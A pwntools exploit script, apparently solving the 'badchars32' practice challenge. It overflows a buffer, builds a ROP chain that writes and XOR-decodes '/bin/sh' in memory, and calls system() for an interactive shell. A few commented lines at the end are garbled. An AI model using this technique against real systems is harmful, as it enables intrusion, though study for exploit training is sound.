from pwn import *
import sys

# config
context(os="linux", arch="i386")
context.log_level = "debug"

FILE_NAME = "./badchars32"
HOST = ""
PORT = 0

if len(sys.argv) > 1 and sys.argv[1] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process(FILE_NAME)

buflen=0x28+4
bss=0x804a040
system=0x080484e0
xor_ebx_cl=0x08048890
mov_edi_esi=0x08048893
pop_ebx_ecx=0x08048896
pop_esi_edi=0x08048899

payload=b"A"*buflen
payload+=p32(pop_esi_edi)
payload+=b'\xd0\x9d\x96\x91'
payload+=p32(bss)
payload+=p32(mov_edi_esi)

payload+=p32(pop_esi_edi)
payload+=b'\xd0\x8ch\x00'
payload+=p32(bss+4)
payload+=p32(mov_edi_esi)

payload+=p32(pop_ebx_ecx)
payload+=p32(bss)
payload+=p32(0xffffffff)
payload+=p32(xor_ebx_cl)

payload+=p32(pop_ebx_ecx)
payload+=p32(bss+1)
payload+=p32(0xffffffff)
payload+=p32(xor_ebx_cl)

payload+=p32(pop_ebx_ecx)
payload+=p32(bss+2)
payload+=p32(0xffffffff)
payload+=p32(xor_ebx_cl)

payload+=p32(pop_ebx_ecx)
payload+=p32(bss+3)
payload+=p32(0xffffffff)
payload+=p32(xor_ebx_cl)

payload+=p32(pop_ebx_ecx)
payload+=p32(bss+4)
payload+=p32(0xffffffff)
payload+=p32(xor_ebx_cl)

payload+=p32(pop_ebx_ecx)
payload+=p32(bss+5)
payload+=p32(0xffffffff)
payload+=p32(xor_ebx_cl)

payload+=p32(system)
payload+=b"BBBB"
payload+=p32(bss)

conn.sendlineafter("> ",payload)
conn.interactive()
# elf=ELF(FILE_NAME)
# addr_main=elf.symbols["main"]
# addr_bss=elf.bss()
# addr_dynsym=elf.get_section_by_name(".dynsym").header["sh_addr"]
#
# libc=ELF("./")
# libc_sh=nex(lib:c.search(b"/bin/sh"))

